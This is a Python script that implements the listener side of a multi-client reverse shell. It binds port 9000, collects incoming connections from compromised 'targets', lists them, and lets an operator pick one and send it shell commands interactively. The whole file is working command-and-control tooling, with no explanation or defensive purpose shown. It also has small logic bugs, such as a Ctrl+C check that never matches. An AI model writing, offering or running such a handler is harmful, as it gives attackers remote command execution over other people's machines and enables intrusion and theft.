import socket
import threading
import logging
import sys
import time
from queue import Queue

logging.basicConfig(level=logging.CRITICAL)

target_address = []
target_connection = []
queue = Queue()
TNO = 2
JNO = [1, 2]

LHOST = ''  # Update the host to a specific IP address if needed
LPORT = 9000  # Update the port if needed

sock = None  # Define the socket variable globally

def create_socket():
    global sock
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Socket Created")
    except socket.error as msg:
        print("Socket Creation Error" + str(msg))
        sys.exit(1)

def bind_socket():
    global sock
    try:
        sock.bind((LHOST, LPORT))
        sock.listen()
        print("Socket is Bound")
    except socket.error as msg:
        print("Socket Binding Error" + str(msg))
        print("Retrying...")
        bind_socket()

#Thread 1
def _accept():
    for c in target_connection:
        c.close()

    # Clear the lists
    del target_address[:]
    del target_connection[:]
    
    while True:
        try:
            conn, addr = sock.accept()
            sock.setblocking(1)

            target_address.append(addr)
            target_connection.append(conn)
            print(f"New Connection {addr}")
        except:
            print("Error Accepting Connection")

#Thread 2
def _input():
    while True:
        cmd = input('input> ')
        if cmd == 'list':
            list_targets()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                shell(conn)

        else:
            print("Command not supported")

def get_target(cmd):
    try:
        target = cmd.replace('select','')
        target = target.replace(' ','')
        target = int(target)
        conn = target_connection[target]
        print("Connection Established to " + str(target_address[target][0]))
        return conn

    except:
        print("Connection Invalid")

def shell(conn):
    while True:
        #Receive data from the target and get user input
        while True:
            target = conn.recv(1024).decode('utf-8', errors='replace')
            sys.stdout.write(target)
            if(len(target)<1024):
                break
            
        command = input()

        #Send command
        command += "\n"

        if command == 'ctrl+c':
            send_ctrl_c(conn)
        else:
            conn.send(command.encode())
            time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + target.split("\n")[-1])

def send_ctrl_c(conn):
    # Send Ctrl+C command
    conn.send(bytes([3]))  # ASCII value for Ctrl+C


def list_targets():
    out = ''

    for i, conn in enumerate(target_connection):
        try:
            conn.send(str.encode(' '))
            conn.recv(1024)
        except: 
            del target_connection[i]
            del target_address[i]
            continue

        out = (str(i) + "   " + str(target_address[i][0]) + "   " + str(target_address[i][1]) + "\n")

    print("Targets"+"\n"+ out)

def workers():
    for _ in range(TNO):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            _accept()
        if x == 2:
            _input()

        queue.task_done()

def jobs():
    for i in JNO:
        queue.put(i)

    queue.join()

workers()
jobs()